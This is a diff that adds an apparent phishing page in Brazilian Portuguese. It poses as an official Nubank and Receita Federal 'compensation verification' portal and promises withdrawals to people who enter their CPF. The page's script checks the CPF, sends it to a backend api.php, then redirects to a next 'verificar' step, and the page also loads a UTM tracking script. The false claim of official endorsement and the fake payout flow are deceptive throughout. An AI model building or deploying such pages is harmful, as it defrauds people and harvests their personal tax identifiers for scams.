@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" crossorigin="" type="font/woff2">
+  <link rel="stylesheet" href="css/4c531af09e53964b.css" data-precedence="next">
+  <link rel="preload" as="script" fetchpriority="low" href="/_next/static/chunks/webpack-16e1aae0254933fa.js">
+  <script src="js/4bd1b696-dd67615fb2881107.js" async=""></script>
+  <script src="js/684-7ad13f0f08a97e29.js" async=""></script>
+  <script src="js/main-app-770f509432689459.js" async=""></script>
+  <script src="js/635-1aa044f5e9636678.js" async=""></script>
+  <script src="js/604-fd8116797c061241.js" async=""></script>
+  <script src="/_next/static/chunks/app/layout-57d92b1f1f9773b4.js" async=""></script>
+  <script src="js/page-1819858e4d662e80.js" async=""></script>
+  <link rel="preload" href="https://cdn.utmify.com.br/scripts/utms/latest.js" as="script">
+  <meta name="next-size-adjust" content="">
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="16x16">
+  <script src="js/polyfills-42372ed130431b0a.js" nomodule=""></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="__className_d65c78 flex flex-col min-h-screen bg-slate-50 vsc-initialized" cz-shortcut-listen="true">
+  <header class="bg-white p-2 shadow-sm">
+    <div class="container mx-auto"><img alt="Logo placeholder" loading="lazy" width="900" height="900" decoding="async"
+        data-nimg="1" class="h-10 w-auto" style="color:transparent" srcset="images/image_5.png 1x, images/image.png 2x"
+        src="images/image.png"></div>
+  </header>
+  <nav class="w-full">
+    <div class="w-full grid grid-cols-3 h-12 bg-white rounded-none border-b">
+      <div class="
+        flex items-center justify-center text-xs h-full
+        text-[#041F55] border-b-2 border-blue-900 bg-[#E6E6E6]
+        transition-colors
+        cursor-default select-none
+      ">Verificar</div>
+      <div class="
+        flex items-center justify-center text-xs h-full
+        text-gray-500
+        transition-colors
+        cursor-default select-none
+      ">Constultando</div>
+      <div class="
+        flex items-center justify-center text-xs h-full
+        text-gray-500
+        transition-colors
+        cursor-default select-none
+      ">Saque</div>
+    </div>
+  </nav>
+  <main class="flex-grow">
+    <div class="p-4 max-w-md mx-auto">
+      <div data-slot="card"
+        class="bg-card text-card-foreground flex flex-col rounded-xl border py-6 border-none shadow-lg relative overflow-hidden gap-0">
+        <div class="absolute left-0 top-0 bottom-0 w-1" style="background:linear-gradient(to bottom, #0E1D5C, #8342CB)">
+        </div>
+        <div data-slot="card-header"
+          class="@container/card-header grid auto-rows-min grid-rows-[auto_auto] items-start gap-1.5 has-data-[slot=card-action]:grid-cols-[1fr_auto] [.border-b]:pb-6 p-4 pb-1">
+          <h1 class="text-xl font-bold text-[#041F55]">Verificação de Indenização - Nubank</h1>
+        </div>
+        <div data-slot="card-content" class="p-4">
+          <p class="mb-6 text-gray-700">A Receita Federal junto com a Nubank disponibilizaram essa página oficial para
+            realizar as consultas e saques.</p>
+          <p class="mb-4 font-medium text-gray-700">Insira o CPF que você utilizou para cadastrar sua conta no
+            aplicativo Nubank.</p>
+          <form id="form-cpf" class="space-y-4">
+            <input type="text" id="cpf" placeholder="Digite seu CPF"
+              class="file:text-foreground placeholder:text-muted-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 flex h-9 w-full min-w-0 rounded-md border bg-transparent text-base shadow-xs transition-[color,box-shadow] outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border-gray-300 p-6">
+            <div id="erro" class="text-red-500 text-sm hidden">CPF inválido</div>
+            <button id="botao-consulta" type="submit"
+              class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm transition-all disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive shadow-xs h-9 has-[>svg]:px-3 w-full bg-[#041F55] hover:bg-blue-900 text-white font-medium p-6">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                class="lucide lucide-search mr-2 h-4 w-4">
+                <circle cx="11" cy="11" r="8"></circle>
+                <path d="m21 21-4.3-4.3"></path>
+              </svg>
+              <span>Realizar Consulta</span>
+            </button>
+
+          </form>
+          <script>
+            function aplicarMascaraCPF(cpf) {
+              return cpf.replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
+            }
+
+            function validarCPF(cpf) {
+              cpf = cpf.replace(/[^\d]+/g, '')
+              if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false
+              let soma = 0, resto
+              for (let i = 1; i <= 9; i++) soma += parseInt(cpf.substring(i - 1, i)) * (11 - i)
+              resto = (soma * 10) % 11
+              if (resto === 10 || resto === 11) resto = 0
+              if (resto !== parseInt(cpf.substring(9, 10))) return false
+              soma = 0
+              for (let i = 1; i <= 10; i++) soma += parseInt(cpf.substring(i - 1, i)) * (12 - i)
+              resto = (soma * 10) % 11
+              if (resto === 10 || resto === 11) resto = 0
+              return resto === parseInt(cpf.substring(10, 11))
+            }
+
+            const input = document.getElementById('cpf')
+            const erroDiv = document.getElementById('erro')
+            const botao = document.querySelector('#form-cpf button')
+
+            input.addEventListener('input', function (e) {
+              e.target.value = aplicarMascaraCPF(e.target.value)
+              erroDiv.classList.add('hidden')
+            })
+
+
+            document.getElementById('form-cpf').addEventListener('submit', async function (e) {
+              e.preventDefault()
+
+              const cpfLimpo = input.value.replace(/[^\d]+/g, '')
+              if (!validarCPF(cpfLimpo)) {
+                erroDiv.classList.remove('hidden')
+                return
+              }
+
+              erroDiv.classList.add('hidden')
+
+              botao.innerHTML = `
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" class="animate-spin mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" class="opacity-25"/>
+                  <path fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" class="opacity-75"/>
+                </svg>
+                Consultando...
+              `
+
+              const resposta = await fetch(`api.php?cpf=${cpfLimpo}`)
+              const dados = await resposta.json()
+
+              if (dados.status === 200) {
+                var currentUrlParams = window.location.search;
+                window.location.href = "verificar" + currentUrlParams;
+
+              } else {
+                botao.innerHTML = `
+                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                    class="lucide lucide-search mr-2 h-4 w-4">
+                    <circle cx="11" cy="11" r="8"></circle>
+                    <path d="m21 21-4.3-4.3"></path>
+                  </svg>
+                  Realizar Consulta
+                `
+                erroDiv.innerText = 'Erro ao consultar CPF'
+                erroDiv.classList.remove('hidden')
+              }
+            })
+          </script>
+
+
+
+        </div>
+      </div>
+    </div>
+  </main>
+  <footer class="mt-auto bg-[#041F55] text-white p-4 pt-1">
+    <div class="mx-auto space-y-2">
+      <div class="flex justify-center items-center"><img alt="Footer logo placeholder" loading="lazy" width="200"
+          height="50" decoding="async" data-nimg="1" class="h-20 w-auto" style="color:transparent"
+          srcset="images/image_4.png 1x, images/image_2.png 2x" src="images/image_2.png"><img
+          alt="Footer logo placeholder" loading="lazy" width="200" height="50" decoding="async" data-nimg="1"
+          class="h-9 w-auto" style="color:transparent" srcset="images/image_3.png 1x, images/image_1.png 2x"
+          src="images/image_1.png"></div>
+      <div data-orientation="horizontal" role="none" data-slot="separator-root"
+        class="bg-border shrink-0 data-[orientation=horizontal]:h-px data-[orientation=horizontal]:w-full data-[orientation=vertical]:h-full data-[orientation=vertical]:w-px text-white">
+      </div>
+      <div class="text-center text-xs">Política de privacidade e Termos de Uso</div>
+    </div>
+  </footer>
+
+
+
+
+</body>
+
+</html>
